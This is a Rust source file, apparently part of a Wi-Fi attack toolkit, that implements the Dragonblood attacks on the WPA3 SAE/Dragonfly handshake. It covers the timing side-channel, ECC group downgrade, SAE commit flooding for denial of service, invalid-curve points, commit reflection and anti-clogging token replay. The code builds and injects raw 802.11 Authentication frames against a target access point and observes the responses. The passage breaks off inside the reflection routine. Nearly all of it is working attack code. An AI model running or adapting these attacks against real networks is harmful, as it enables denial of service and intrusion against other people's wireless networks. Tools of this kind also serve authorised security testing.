//! WPA3/Dragonblood — 8 attack modes targeting the SAE/Dragonfly handshake.
//!
//! CVE-2019-9494: SAE timing side-channel (password element derivation)
//! CVE-2019-9495: ECC group downgrade (force weaker curve)
//! CVE-2019-9496: WPA3 transition mode downgrade to WPA2
//! CVE-2019-9497: SAE commit flood DoS (heavy crypto exhaustion)
//! CVE-2019-9498: Invalid elliptic curve point (SAE)
//! CVE-2019-9499: Invalid curve point (EAP-pwd)
//! + SAE reflection (replay AP's Commit back to itself)
//! + Anti-clogging token trigger and replay
//!
//! Key insight: We don't need full Dragonfly crypto for these attacks.
//! We craft SAE Auth frames with random or invalid data and observe AP
//! behavior — timing, acceptance, rejection patterns, crash.
//!
//! SAE protocol:
//!   Auth frame (algo=3, seq=1): SAE Commit — Group ID + Scalar + Element
//!   Auth frame (algo=3, seq=2): SAE Confirm — Send-Confirm + Confirm hash
//!   Status=76: ANTI_CLOGGING_TOKEN_REQUIRED
//!   Status=77: UNSUPPORTED_FINITE_CYCLIC_GROUP
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel, sends crafted SAE Auth frames, monitors
//!   AP responses. Each mode has specific inject-observe methodology.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_wpa3.c`.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::store::Ap;
use crate::protocol::sae::sae_status;

// ═══════════════════════════════════════════════════════════════════════════════
//  WPA3 Attack Modes
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Wpa3Mode {
    /// CVE-2019-9494: Timing side-channel in SAE password element derivation.
    Timing,
    /// CVE-2019-9495: ECC group downgrade — force weaker curve.
    GroupDowngrade,
    /// CVE-2019-9497: SAE commit flood DoS — exhaust AP crypto.
    CommitFlood,
    /// CVE-2019-9498/9499: Invalid elliptic curve point acceptance.
    InvalidCurve,
    /// CVE-2019-9496: WPA3 transition mode downgrade to WPA2.
    TransitionDowngrade,
    /// SAE reflection — replay AP's own Commit back.
    Reflection,
    /// Anti-clogging token trigger and replay.
    TokenReplay,
    /// Full scan — run all applicable tests sequentially.
    FullScan,
}

impl Wpa3Mode {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Timing => "timing",
            Self::GroupDowngrade => "group-downgrade",
            Self::CommitFlood => "commit-flood",
            Self::InvalidCurve => "invalid-curve",
            Self::TransitionDowngrade => "transition",
            Self::Reflection => "reflection",
            Self::TokenReplay => "token-replay",
            Self::FullScan => "full-scan",
        }
    }

    pub fn cve(&self) -> &'static str {
        match self {
            Self::Timing => "CVE-2019-9494",
            Self::GroupDowngrade => "CVE-2019-9495",
            Self::CommitFlood => "CVE-2019-9497",
            Self::InvalidCurve => "CVE-2019-9498",
            Self::TransitionDowngrade => "CVE-2019-9496",
            Self::Reflection => "SAE-Reflection",
            Self::TokenReplay => "Token-Replay",
            Self::FullScan => "Full-Scan",
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            Self::Timing => "SAE timing side-channel — password element derivation leak",
            Self::GroupDowngrade => "ECC group downgrade — force weaker curve acceptance",
            Self::CommitFlood => "SAE commit flood — exhaust AP with heavy ECC computation",
            Self::InvalidCurve => "Invalid curve point — AP accepts point NOT on the curve",
            Self::TransitionDowngrade => "WPA3→WPA2 transition downgrade via rogue AP",
            Self::Reflection => "SAE commit reflection — replay AP's own Commit back",
            Self::TokenReplay => "Anti-clogging token trigger and replay",
            Self::FullScan => "Full Dragonblood vulnerability scan (all 7 tests)",
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "timing" | "9494" | "cve-2019-9494" => Some(Self::Timing),
            "group" | "group-downgrade" | "downgrade" | "9495" | "cve-2019-9495" => Some(Self::GroupDowngrade),
            "flood" | "commit-flood" | "dos" | "9497" | "cve-2019-9497" => Some(Self::CommitFlood),
            "curve" | "invalid-curve" | "9498" | "cve-2019-9498" => Some(Self::InvalidCurve),
            "transition" | "9496" | "cve-2019-9496" => Some(Self::TransitionDowngrade),
            "reflection" | "reflect" => Some(Self::Reflection),
            "token" | "token-replay" => Some(Self::TokenReplay),
            "all" | "full" | "full-scan" => Some(Self::FullScan),
            _ => None,
        }
    }

    /// All 7 individual test modes (excluding FullScan meta-mode).
    pub fn all_tests() -> &'static [Wpa3Mode] {
        &[
            Self::Timing, Self::GroupDowngrade, Self::InvalidCurve,
            Self::Reflection, Self::TokenReplay, Self::CommitFlood,
            Self::TransitionDowngrade,
        ]
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPA3 Parameters
// ═══════════════════════════════════════════════════════════════════════════════

#[allow(dead_code)]
#[derive(Clone, Debug)]
pub struct Wpa3Params {
    /// Attack mode. Default: FullScan.
    pub mode: Wpa3Mode,

    // === Timing attack ===
    /// Number of timing samples per group. Default: 50.
    pub timing_samples: u32,
    /// Delay between timing probes. Default: 100ms.
    pub timing_delay: Duration,
    /// Coefficient of variation threshold (%) for timing vulnerability. Default: 15.0.
    pub timing_cv_threshold: f64,

    // === Commit flood ===
    /// Number of commits to flood (0 = unlimited until stopped). Default: 500.
    pub flood_count: u32,
    /// Flood rate in commits/sec (0 = max rate). Default: 100.
    pub flood_rate: u32,

    // === Transition downgrade ===
    /// Duration to run rogue WPA2 AP. Default: 60s.
    pub downgrade_duration: Duration,
    /// Rogue channel for transition downgrade. 0 = same as target. Default: 0.
    pub rogue_channel: u8,

    // === Timeouts ===
    /// Timeout waiting for SAE response. Default: 2s.
    pub commit_timeout: Duration,
    /// Wait after channel lock for PLL/AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
    /// RX poll timeout. Default: 200ms.
    pub rx_poll_timeout: Duration,
    /// Overall attack timeout (0 = no limit). Default: 0.
    pub timeout: Duration,

    // === Groups ===
    /// ECC groups to test. Default: [19, 20, 21].
    pub groups: Vec<u16>,
}

impl Default for Wpa3Params {
    fn default() -> Self {
        Self {
            mode: Wpa3Mode::FullScan,
            timing_samples: 50,
            timing_delay: Duration::from_millis(100),
            timing_cv_threshold: 15.0,
            flood_count: 500,
            flood_rate: 100,
            downgrade_duration: Duration::from_secs(60),
            rogue_channel: 0,
            commit_timeout: Duration::from_secs(2),
            channel_settle: Duration::from_millis(50),
            rx_poll_timeout: Duration::from_millis(200),
            timeout: Duration::ZERO,
            groups: vec![19, 20, 21],
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPA3 Phase
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Wpa3Phase {
    Idle,
    ChannelLock,
    Probing,
    Flooding,
    Analyzing,
    Done,
}

impl Default for Wpa3Phase {
    fn default() -> Self { Self::Idle }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Per-mode verdict
// ═══════════════════════════════════════════════════════════════════════════════

#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Wpa3Verdict {
    Pending,
    Testing,
    Vulnerable,
    NotVulnerable,
    Skipped,
    Error,
}

impl Default for Wpa3Verdict {
    fn default() -> Self { Self::Pending }
}

#[derive(Debug, Clone)]
pub struct Wpa3TestResult {
    pub mode: Wpa3Mode,
    pub verdict: Wpa3Verdict,
    pub detail: String,
    pub elapsed: Duration,
    // Timing-specific
    pub timing_mean_us: f64,
    pub timing_stddev_us: f64,
    pub timing_cv: f64,
    pub timing_samples_count: u32,
    // Group downgrade-specific
    pub groups_tested: u32,
    pub groups_accepted: u32,
    pub weakest_group: u16,
    // Flood-specific
    pub flood_sent: u32,
    pub flood_responded: u32,
    pub flood_tokens_triggered: u32,
    // General
    pub frames_sent: u64,
    pub frames_received: u64,
}

impl Wpa3TestResult {
    pub fn new(mode: Wpa3Mode) -> Self {
        Self {
            mode,
            verdict: Wpa3Verdict::Pending,
            detail: String::new(),
            elapsed: Duration::ZERO,
            timing_mean_us: 0.0,
            timing_stddev_us: 0.0,
            timing_cv: 0.0,
            timing_samples_count: 0,
            groups_tested: 0,
            groups_accepted: 0,
            weakest_group: 0,
            flood_sent: 0,
            flood_responded: 0,
            flood_tokens_triggered: 0,
            frames_sent: 0,
            frames_received: 0,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPA3 Final Result — aggregate result after completion
// ═══════════════════════════════════════════════════════════════════════════════

/// Aggregate result produced when the Dragonblood attack completes.
#[derive(Debug, Clone, Default)]
pub struct Wpa3FinalResult {
    /// Per-mode test results.
    pub results: Vec<Wpa3TestResult>,
    /// Number of modes that were actually tested (not skipped).
    pub modes_tested: u32,
    /// Number of modes found vulnerable.
    pub modes_vulnerable: u32,
    /// Total elapsed time for the entire attack.
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPA3 Info
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct Wpa3Info {
    pub phase: Wpa3Phase,
    pub running: bool,
    pub target_bssid: MacAddress,
    pub target_ssid: String,
    pub target_channel: u8,
    pub target_is_wpa3: bool,
    pub target_transition: bool,
    pub current_mode: Option<Wpa3Mode>,
    pub mode_index: u32,
    pub mode_total: u32,
    pub commits_sent: u64,
    pub commits_received: u64,
    pub frames_sent: u64,
    pub frames_received: u64,
    pub modes_tested: u32,
    pub modes_vulnerable: u32,
    pub modes_skipped: u32,
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === TX Feedback (ACK/NACK from firmware) ===
    pub tx_feedback: crate::core::TxFeedbackSnapshot,

    pub results: Vec<Wpa3TestResult>,
}

impl Default for Wpa3Info {
    fn default() -> Self {
        Self {
            phase: Wpa3Phase::Idle,
            running: false,
            target_bssid: MacAddress::ZERO,
            target_ssid: String::new(),
            target_channel: 0,
            target_is_wpa3: false,
            target_transition: false,
            current_mode: None,
            mode_index: 0,
            mode_total: 0,
            commits_sent: 0,
            commits_received: 0,
            frames_sent: 0,
            frames_received: 0,
            modes_tested: 0,
            modes_vulnerable: 0,
            modes_skipped: 0,
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            tx_feedback: Default::default(),
            results: Vec::new(),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPA3 Events
// ═══════════════════════════════════════════════════════════════════════════════

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct Wpa3Event {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: Wpa3EventKind,
}

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum Wpa3EventKind {
    AttackStarted { bssid: MacAddress, ssid: String, channel: u8, is_wpa3: bool, transition: bool },
    ChannelLocked { channel: u8 },
    ModeStarted { mode: Wpa3Mode, index: u32, total: u32 },
    CommitSent { group: u16 },
    ResponseReceived { status: u16, got_commit: bool },
    TimingSample { group: u16, response_us: u64, sample_num: u32 },
    TimingResult { mean_us: f64, stddev_us: f64, cv: f64, vulnerable: bool },
    GroupTested { group: u16, accepted: bool, status: u16 },
    InvalidCurveResult { accepted: bool, group: u16 },
    ReflectionResult { accepted: bool },
    TokenTriggered,
    TokenReplayResult { accepted: bool },
    FloodProgress { sent: u32, responded: u32, tokens: u32, rate: f64 },
    ModeComplete { mode: Wpa3Mode, verdict: Wpa3Verdict, elapsed_ms: u64 },
    ModeSkipped { mode: Wpa3Mode, reason: String },
    AttackComplete { tested: u32, vulnerable: u32, skipped: u32, total: u32, elapsed: Duration },
    ChannelUnlocked,
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Wpa3Attack — the attack engine
// ═══════════════════════════════════════════════════════════════════════════════

pub struct Wpa3Attack {
    params: Wpa3Params,
    info: Arc<Mutex<Wpa3Info>>,
    events: Arc<EventRing<Wpa3Event>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
}

impl Wpa3Attack {
    pub fn new(params: Wpa3Params) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(Wpa3Info::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&self, shared: SharedAdapter, target: Ap) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        let modes: Vec<Wpa3Mode> = if params.mode == Wpa3Mode::FullScan {
            Wpa3Mode::all_tests().to_vec()
        } else {
            vec![params.mode]
        };

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);

        let is_wpa3 = matches!(target.security,
            crate::protocol::ieee80211::Security::Wpa3 |
            crate::protocol::ieee80211::Security::Wpa3Enterprise);
        // TODO: Check RSN IE for both PSK and SAE AKM suites
        let is_transition = false;

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.phase = Wpa3Phase::ChannelLock;
            info.target_bssid = target.bssid;
            info.target_ssid = target.ssid.clone();
            info.target_channel = target.channel;
            info.target_is_wpa3 = is_wpa3;
            info.target_transition = is_transition;
            info.mode_total = modes.len() as u32;
            info.results = modes.iter().map(|m| Wpa3TestResult::new(*m)).collect();
        }

        thread::Builder::new()
            .name("wpa3".into())
            .spawn(move || {
                let reader = shared.subscribe("wpa3");
                run_wpa3_attack(&shared, &reader, &target, &modes, &params, &info, &events, &running);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = Wpa3Phase::Done;
                }
            })
            .expect("failed to spawn wpa3 thread");
    }

    pub fn signal_stop(&self) { self.running.store(false, Ordering::SeqCst); }
    pub fn is_done(&self) -> bool { self.done.load(Ordering::SeqCst) }
    #[allow(dead_code)]
    pub fn is_running(&self) -> bool { self.running.load(Ordering::SeqCst) }
    pub fn info(&self) -> Wpa3Info { self.info.lock().unwrap_or_else(|e| e.into_inner()).clone() }
    pub fn events(&self) -> Vec<Wpa3Event> { self.events.drain() }
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str { "wpa3" }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic
// ═══════════════════════════════════════════════════════════════════════════════

fn run_wpa3_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    modes: &[Wpa3Mode],
    params: &Wpa3Params,
    info: &Arc<Mutex<Wpa3Info>>,
    events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>,
) {
    let start = Instant::now();
    let our_mac = shared.mac();
    let tx_fb = shared.tx_feedback();
    tx_fb.reset();

    let is_wpa3 = {
        let i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.target_is_wpa3
    };
    let is_transition = {
        let i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.target_transition
    };

    push_event(events, start, Wpa3EventKind::AttackStarted {
        bssid: target.bssid, ssid: target.ssid.clone(), channel: target.channel,
        is_wpa3, transition: is_transition,
    });

    if let Err(e) = shared.lock_channel(target.channel, "wpa3") {
        push_event(events, start, Wpa3EventKind::Error {
            message: format!("channel lock to ch{} failed: {e}", target.channel),
        });
        return;
    }
    push_event(events, start, Wpa3EventKind::ChannelLocked { channel: target.channel });
    thread::sleep(params.channel_settle);

    let mut total_tested: u32 = 0;
    let mut total_vulnerable: u32 = 0;
    let mut total_skipped: u32 = 0;

    for (idx, mode) in modes.iter().enumerate() {
        if !running.load(Ordering::SeqCst) { break; }
        if params.timeout > Duration::ZERO && start.elapsed() >= params.timeout { break; }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.mode_index = idx as u32 + 1;
            info.current_mode = Some(*mode);
            info.elapsed = start.elapsed();
        }

        push_event(events, start, Wpa3EventKind::ModeStarted {
            mode: *mode, index: idx as u32 + 1, total: modes.len() as u32,
        });

        // Transition downgrade needs AP engine (not yet implemented)
        if *mode == Wpa3Mode::TransitionDowngrade {
            let reason = if !is_transition {
                "target not in transition mode".to_string()
            } else {
                "requires AP engine (not yet implemented)".to_string()
            };
            push_event(events, start, Wpa3EventKind::ModeSkipped { mode: *mode, reason: reason.clone() });
            total_skipped += 1;
            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.modes_skipped = total_skipped;
                if let Some(r) = info.results.iter_mut().find(|r| r.mode == *mode) {
                    r.verdict = Wpa3Verdict::Skipped;
                    r.detail = reason;
                }
            }
            push_event(events, start, Wpa3EventKind::ModeComplete {
                mode: *mode, verdict: Wpa3Verdict::Skipped, elapsed_ms: 0,
            });
            continue;
        }

        let result = run_mode(
            shared, reader, &target.bssid, *mode, params, &our_mac,
            info, events, running, start,
        );

        total_tested += 1;
        if result.verdict == Wpa3Verdict::Vulnerable { total_vulnerable += 1; }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.modes_tested = total_tested;
            info.modes_vulnerable = total_vulnerable;
            if let Some(r) = info.results.iter_mut().find(|r| r.mode == *mode) {
                *r = result.clone();
            }
        }

        push_event(events, start, Wpa3EventKind::ModeComplete {
            mode: *mode, verdict: result.verdict, elapsed_ms: result.elapsed.as_millis() as u64,
        });
    }

    shared.unlock_channel();
    push_event(events, start, Wpa3EventKind::ChannelUnlocked);

    let elapsed = start.elapsed();
    push_event(events, start, Wpa3EventKind::AttackComplete {
        tested: total_tested, vulnerable: total_vulnerable,
        skipped: total_skipped, total: modes.len() as u32, elapsed,
    });

    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.elapsed = elapsed;
        let secs = elapsed.as_secs_f64();
        if secs > 0.0 {
            info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
        }
        info.tx_feedback = tx_fb.snapshot();
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Per-mode test logic
// ═══════════════════════════════════════════════════════════════════════════════

fn run_mode(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    mode: Wpa3Mode,
    params: &Wpa3Params,
    our_mac: &MacAddress,
    info: &Arc<Mutex<Wpa3Info>>,
    events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>,
    attack_start: Instant,
) -> Wpa3TestResult {
    let mode_start = Instant::now();
    let mut result = Wpa3TestResult::new(mode);
    result.verdict = Wpa3Verdict::Testing;

    match mode {
        Wpa3Mode::Timing => run_timing(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
        Wpa3Mode::GroupDowngrade => run_group_downgrade(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
        Wpa3Mode::CommitFlood => run_commit_flood(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
        Wpa3Mode::InvalidCurve => run_invalid_curve(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
        Wpa3Mode::Reflection => run_reflection(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
        Wpa3Mode::TokenReplay => run_token_replay(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
        _ => { result.verdict = Wpa3Verdict::Skipped; }
    }

    result.elapsed = mode_start.elapsed();
    result
}

/// Build and send an SAE Commit frame with random scalar/element.
fn send_sae_commit(
    shared: &SharedAdapter,
    bssid: &MacAddress,
    our_mac: &MacAddress,
    group_id: u16,
    invalid_element: bool,
    info: &Arc<Mutex<Wpa3Info>>,
) -> bool {
    let scalar_len = sae_scalar_len(group_id);
    let element_len = scalar_len * 2; // x + y coordinates

    let mut frame = Vec::with_capacity(30 + 2 + scalar_len + element_len);

    // Auth frame header: FC=0xB0 (Authentication), Duration, Addresses, SeqCtl
    frame.push(0xB0); // Authentication frame
    frame.push(0x00);
    frame.extend_from_slice(&[0x3A, 0x01]); // Duration
    frame.extend_from_slice(bssid.as_bytes()); // DA = AP
    frame.extend_from_slice(our_mac.as_bytes()); // SA = us
    frame.extend_from_slice(bssid.as_bytes()); // BSSID
    frame.extend_from_slice(&[0x00, 0x00]); // Seq Ctl

    // Fixed fields: Auth Algo (SAE=3), Seq (1=Commit), Status (0=Success)
    frame.extend_from_slice(&3u16.to_le_bytes()); // SAE
    frame.extend_from_slice(&1u16.to_le_bytes()); // Commit
    frame.extend_from_slice(&0u16.to_le_bytes()); // Success

    // SAE Commit body: Group ID
    frame.extend_from_slice(&group_id.to_le_bytes());

    // Scalar (random bytes)
    let mut scalar = vec![0u8; scalar_len];
    fill_pseudo_random(&mut scalar);
    frame.extend_from_slice(&scalar);

    // Element (random or invalid)
    let mut element = vec![0u8; element_len];
    if invalid_element {
        // Invalid curve point: set all 0xFF with small x
        for b in element.iter_mut() { *b = 0xFF; }
        element[0] = 0x00;
        element[1] = 0x00;
        element[2] = 0x42;
    } else {
        fill_pseudo_random(&mut element);
    }
    frame.extend_from_slice(&element);

    if shared.tx_frame(&frame, &TxOptions::default()).is_ok() {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_sent += 1;
        info.commits_sent += 1;
        true
    } else {
        false
    }
}

/// Wait for an SAE Auth response from the AP.
/// Returns Some((status, got_commit, response_frame)) or None on timeout.
fn wait_sae_response(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    timeout: Duration,
    running: &Arc<AtomicBool>,
    info: &Arc<Mutex<Wpa3Info>>,
    rx_poll_timeout: Duration,
) -> Option<(u16, bool, Vec<u8>)> {
    let deadline = Instant::now() + timeout;

    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        if now >= deadline { return None; }

        let remaining = deadline - now;
        let rx_timeout = remaining.min(rx_poll_timeout);

        match reader.recv_timeout(rx_timeout) {
            Some(frame) => {
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_received += 1;
                }

                if frame.raw.len() < 30 { continue; }
                // Must be Auth frame (type=0, subtype=11 -> FC byte 0 = 0xB0)
                if frame.raw[0] != 0xB0 { continue; }
                // From our target
                if frame.addr2.map_or(true, |a| a != *bssid) { continue; }

                let auth_algo = u16::from_le_bytes([frame.raw[24], frame.raw[25]]);
                if auth_algo != 3 { continue; } // Not SAE

                let auth_seq = u16::from_le_bytes([frame.raw[26], frame.raw[27]]);
                let status = u16::from_le_bytes([frame.raw[28], frame.raw[29]]);

                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.commits_received += 1;
                }

                let got_commit = status == 0 && auth_seq == 1;
                return Some((status, got_commit, frame.raw.to_vec()));
            }
            None => continue,
        }
    }
    None
}

// === Timing Attack (CVE-2019-9494) ===
fn run_timing(
    shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
    our_mac: &MacAddress, result: &mut Wpa3TestResult,
    info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>, attack_start: Instant,
) {
    update_phase(info, Wpa3Phase::Probing);
    let mut timings: Vec<(u16, u64)> = Vec::new(); // (group_id, response_us)

    for &group_id in &params.groups {
        for sample in 0..params.timing_samples {
            if !running.load(Ordering::SeqCst) { return; }

            let t0 = Instant::now();
            if !send_sae_commit(shared, bssid, our_mac, group_id, false, info) { continue; }
            result.frames_sent += 1;

            if let Some((_status, _, _)) = wait_sae_response(
                reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
            ) {
                let response_us = t0.elapsed().as_micros() as u64;
                timings.push((group_id, response_us));
                result.frames_received += 1;

                push_event(events, attack_start, Wpa3EventKind::TimingSample {
                    group: group_id, response_us, sample_num: sample + 1,
                });
            }

            if params.timing_delay > Duration::ZERO {
                thread::sleep(params.timing_delay);
            }
        }
    }

    // Analyze timing data
    update_phase(info, Wpa3Phase::Analyzing);
    result.timing_samples_count = timings.len() as u32;

    if !timings.is_empty() {
        let sum: f64 = timings.iter().map(|(_, t)| *t as f64).sum();
        let mean = sum / timings.len() as f64;
        let var_sum: f64 = timings.iter().map(|(_, t)| {
            let v = *t as f64;
            (v - mean) * (v - mean)
        }).sum();
        let variance = var_sum / timings.len() as f64;
        let stddev = variance.sqrt();
        let cv = if mean > 0.0 { stddev / mean * 100.0 } else { 0.0 };

        result.timing_mean_us = mean;
        result.timing_stddev_us = stddev;
        result.timing_cv = cv;

        let vulnerable = cv > params.timing_cv_threshold;
        result.verdict = if vulnerable { Wpa3Verdict::Vulnerable } else { Wpa3Verdict::NotVulnerable };
        result.detail = format!("CV={:.1}% (threshold={:.0}%), mean={:.0}us, stddev={:.0}us",
            cv, params.timing_cv_threshold, mean, stddev);

        push_event(events, attack_start, Wpa3EventKind::TimingResult {
            mean_us: mean, stddev_us: stddev, cv, vulnerable,
        });
    } else {
        result.verdict = Wpa3Verdict::NotVulnerable;
        result.detail = "no responses received".to_string();
    }
}

// === Group Downgrade (CVE-2019-9495) ===
fn run_group_downgrade(
    shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
    our_mac: &MacAddress, result: &mut Wpa3TestResult,
    info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>, attack_start: Instant,
) {
    update_phase(info, Wpa3Phase::Probing);

    // Test groups from weakest to strongest
    let groups: &[u16] = &[28, 19, 29, 20, 30, 21]; // BP256, P256, BP384, P384, BP512, P521
    let mut accepted: Vec<u16> = Vec::new();

    for &group_id in groups {
        if !running.load(Ordering::SeqCst) { break; }

        if !send_sae_commit(shared, bssid, our_mac, group_id, false, info) { continue; }
        result.frames_sent += 1;
        result.groups_tested += 1;

        let group_accepted = if let Some((status, got_commit, _)) = wait_sae_response(
            reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
        ) {
            result.frames_received += 1;
            // Accepted if AP responds with Commit or anti-clogging token request
            let acc = got_commit || status == sae_status::ANTI_CLOGGING_TOKEN_REQUIRED;
            push_event(events, attack_start, Wpa3EventKind::GroupTested {
                group: group_id, accepted: acc, status,
            });
            acc
        } else {
            push_event(events, attack_start, Wpa3EventKind::GroupTested {
                group: group_id, accepted: false, status: 0xFFFF,
            });
            false
        };

        if group_accepted {
            accepted.push(group_id);
            result.groups_accepted += 1;
            if result.weakest_group == 0 { result.weakest_group = group_id; }
        }

        thread::sleep(Duration::from_millis(200));
    }

    // Vulnerable if AP accepts multiple groups (especially non-mandatory ones)
    result.verdict = if accepted.len() > 1 {
        result.detail = format!("{} groups accepted, weakest: Group {}",
            accepted.len(), result.weakest_group);
        Wpa3Verdict::Vulnerable
    } else {
        result.detail = format!("{} groups accepted", accepted.len());
        Wpa3Verdict::NotVulnerable
    };
}

// === Invalid Curve Point (CVE-2019-9498/9499) ===
fn run_invalid_curve(
    shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
    our_mac: &MacAddress, result: &mut Wpa3TestResult,
    info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>, attack_start: Instant,
) {
    update_phase(info, Wpa3Phase::Probing);

    // Send commit with invalid curve point for P-256
    if !send_sae_commit(shared, bssid, our_mac, 19, true, info) { return; }
    result.frames_sent += 1;

    let accepted = if let Some((status, got_commit, _)) = wait_sae_response(
        reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
    ) {
        result.frames_received += 1;
        got_commit || status == 0 || status == sae_status::ANTI_CLOGGING_TOKEN_REQUIRED
    } else {
        false
    };

    push_event(events, attack_start, Wpa3EventKind::InvalidCurveResult {
        accepted, group: 19,
    });

    result.verdict = if accepted {
        result.detail = "AP accepted invalid curve point — CRITICAL".to_string();
        Wpa3Verdict::Vulnerable
    } else {
        result.detail = "AP properly rejected invalid point".to_string();
        Wpa3Verdict::NotVulnerable
    };
}

// === SAE Reflection ===
fn run_reflection(
    shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
    our_mac: &MacAddress, result: &mut Wpa3TestResult,
    info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>, attack_start: Instant,
) {
    update_phase(info, Wpa3Phase::Probing);

    // Get AP's own Commit
    if !send_sae_commit(shared, bssid, our_mac, 19, false, info) { return; }
    result.frames_sent += 1;

    let ap_commit = if let Some((_status, got_commit, data)) = wait_sae_response(
        reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
    ) {
        result.frames_received += 1;
        if got_commit { Some(data) } else { None }
    } else {
        None
    };

    let ap_commit = match ap_commit {
        Some(c) => c,
        None => {
            result.verdict = Wpa3Verdict::NotVulnerable;
            result.detail = "could not capture AP Commit for reflection".to_string();
            return;
        }
    };

    // Replay AP's Commit back with our MAC as source
    let mut reflected = ap_commit.clone();
    if reflected.len() >= 22 {
        reflected[4..10].copy_from_slice(bssid.as_bytes()); // DA = AP
        reflected[10..16].copy_from_slice(our_mac.as_bytes()); // SA = us
    }

    if shared.tx_frame(&reflected, &TxOptions::default()).is_ok() {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_sent += 1;
        result.frames_sent += 1;
    }

    // Check if AP processes the reflected commit
    let accepted = if let Some((status, got_commit, _)) = wait_sae_response(
        reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
    ) {
        result.frames_received += 1;
        got_commit || status == 0
    } else {
        false
    };

    push_event(events, attack_start, Wpa3EventKind::ReflectionResult { accepted });

    result.verdict = if accepted {
        result.detail = "AP processed reflected Commit — key confusion possible".to_string();
